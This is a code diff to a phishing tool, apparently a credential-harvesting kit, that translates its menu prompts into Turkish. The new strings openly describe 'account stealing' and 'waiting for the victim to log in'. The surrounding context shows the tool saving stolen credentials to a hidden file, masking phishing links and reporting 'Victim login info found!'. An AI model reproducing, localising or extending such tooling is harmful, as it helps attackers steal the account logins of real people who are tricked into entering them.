@@ -270,7 +270,7 @@ else:
     saved_file = f"{home}/.creds.txt"
 
 
-print(f"\n{info}BEKLE Bİ AQ{nc}")
+print(f"\n{info}Hesap Çalma Menüsüne yönlendiriyorum (emir){nc}")
 
 argparser = ArgumentParser()
 
@@ -822,7 +822,7 @@ def lx_token():
         status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
         if not "error" in status:
             break
-        has_token = input(f"\n{ask}KİLİT BİLETİN YOKSA N VARSA Y YAZ: {green}")
+        has_token = input(f"\n{ask}Biletin var mı Y/N: {green}")
         if has_token == "y":
             shell(f"{lx_command} account login")
             break
@@ -993,7 +993,7 @@ def about():
 # Optional function for url masking
 def masking(url):
     global kshrt
-    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help] : {yellow}")
+    cust = input(f"\n{ask}{bcyan}Linki Değiştirmek İster Misin {green}[{blue}Y/N/YARDIM] : {yellow}")
     if cust in [ "", "n", "N", "no" ]:
         return
     if cust == "help":
@@ -1259,7 +1259,7 @@ def main_menu():
         elif mode == "test":
             choice = default_template
         else:
-            choice = input(f"{ask}OLTALAMA YAPILACAK OLANI SEÇ > {green}")
+            choice = input(f"{ask}Çalınacak Hesabı Seç {green}")
         if choice != "0" and choice.startswith("0"):
             choice = choice.replace("0", "")
         if choice in choices:
@@ -1421,7 +1421,7 @@ def server():
 def waiter():
     global is_mail_ok
     delete(ip_file, cred_file)
-    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
+    sprint(f"\n{info}{blue}KURBANIN GİRMESİ BEKLENİYOR{cyan}Press {red}Ctrl+C{cyan} to exit")
     try:
         while True:
             if isfile(ip_file):
@@ -1432,7 +1432,7 @@ def waiter():
                 # Just add the ip
                 append(ipdata.split("\n")[0], saved_file)
                 print(f"\n{info2}Saved in {main_ip}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info}{blue}Waiting for next.....{cyan}Çıkmak İçin {red}Ctrl+C{cyan} BASABİLİRSİN")
                 remove(ip_file)
             if isfile(cred_file):
                 print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
